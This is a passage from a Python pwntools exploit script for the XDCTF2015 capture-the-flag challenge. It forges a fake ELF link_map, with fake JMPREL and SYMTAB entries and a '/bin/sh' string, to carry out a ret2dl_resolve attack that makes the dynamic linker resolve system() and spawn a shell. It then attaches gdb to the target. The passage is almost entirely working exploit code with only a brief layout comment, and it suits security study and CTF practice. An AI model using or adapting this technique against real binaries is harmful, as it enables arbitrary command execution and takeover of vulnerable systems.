'''
 linkmap:
 0x00: l_addr = offset_of_two_addr

 fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8
 0x08: 17, tag of the JMPREL
 0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL


 fake_JMPREL, addr = fake_linkmap_addr + 0x18
 0x18: p_r_offset, offset pointer to the resloved addr
 0x20: r_info
 0x28: append

 resolved addr
 0x30: r_offset
 fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x38
 0x38: 6, tag of the DT_SYMTAB
 0x40: known_function_ptr-8, p_fake_symbol_table
 command that you want to execute for system
 0x48: /bin/sh
 P_DT_STRTAB, pointer for DT_STRTAB
 0x68: fake a pointer, e.g., fake_linkmap_addr
 p_DT_SYMTAB, pointer for fake_DT_SYMTAB
 0x70: fake_linkmap_addr + 0x38
 p_DT_JMPREL, pointer for fake_DT_JMPREL
 0xf8: fake_linkmap_addr + 0x8
 '''
    plt0 = elf.get_section_by_name('.plt').header.sh_addr

    linkmap = p64(offset_of_two_addr & (2**64 - 1))
    linkmap += p64(17) + p64(fake_linkmap_addr + 0x18)
    # here we set p_r_offset = fake_linkmap_addr + 0x30 - two_offset
    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = offset_of_two_addr
    linkmap += p64((fake_linkmap_addr + 0x30 - offset_of_two_addr)
                   & (2**64 - 1)) + p64(0x7) + p64(0)
    linkmap += p64(0)
    linkmap += p64(6) + p64(known_function_ptr-8)
    linkmap += '/bin/sh\x00'           # cmd offset 0x48
    linkmap = linkmap.ljust(0x68, 'A')
    linkmap += p64(fake_linkmap_addr)
    linkmap += p64(fake_linkmap_addr + 0x38)
    linkmap = linkmap.ljust(0xf8, 'A')
    linkmap += p64(fake_linkmap_addr + 8)

    resolve_call = p64(plt0+6) + p64(fake_linkmap_addr) + p64(0)
    return (linkmap, resolve_call)


io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)
